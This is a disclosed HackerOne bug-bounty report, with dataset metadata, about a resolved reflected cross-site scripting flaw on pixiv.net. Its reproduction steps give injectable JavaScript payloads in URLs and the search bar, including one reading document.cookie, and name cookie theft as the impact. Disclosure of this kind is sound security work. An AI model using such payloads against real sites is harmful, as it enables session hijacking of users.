---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '766633'
original_report_id: '766633'
title: XSS reflected on [https://www.pixiv.net]
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: pixiv
created_at: '2019-12-31T23:31:06.441Z'
disclosed_at: '2020-12-17T03:33:46.885Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 136
asset_identifier: www.pixiv.net
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS reflected on [https://www.pixiv.net]

## Metadata

- HackerOne Report ID: 766633
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: pixiv
- Disclosed At: 2020-12-17T03:33:46.885Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
I found a xss reflected on https://www.pixiv.com URL and in the search bottom from Chrome IOS 13.1

## Steps To Reproduce:

  1. In the URL https://www.pixiv.net/en/%5B'-alert(document.cookie)-'%5D Add Payload ['-confirm(3)-']
  1. In the URL https://www.pixiv.net/en/%5B'-alert(document.cookie)-'%5D Add ['-alert(document.cookie)-']
  1. In the Search Bar Add ['-confirm(3)-'] and the URL is https://www.pixiv.net/en/tags/%5B'-confirm(3)-'%5D#discover

## Impact

Steal Cookie

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
